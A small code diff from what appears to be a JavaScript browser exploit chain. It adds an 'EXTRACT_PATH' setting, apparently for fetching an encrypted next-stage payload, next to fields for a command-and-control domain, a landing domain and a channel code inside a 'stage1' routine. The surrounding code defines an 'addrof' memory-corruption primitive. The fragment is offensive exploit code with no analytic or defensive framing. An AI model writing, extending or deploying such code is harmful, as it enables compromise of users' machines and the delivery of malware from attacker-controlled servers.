@@ -285,6 +285,7 @@ self[1] = boxed_arr;
           self.CHANNEL_CODE = data.channelCode || "";
           self.C2_DOMAIN = data.c2Domain || "";
           self.LANDING_DOMAIN = data.landingDomain || "";
+          self.EXTRACT_PATH = data.extractPath || "/extract.js.enc";
           print("inside stage1");
           p.addrof = function addrof(o) {
             boxed_arr[0] = o;
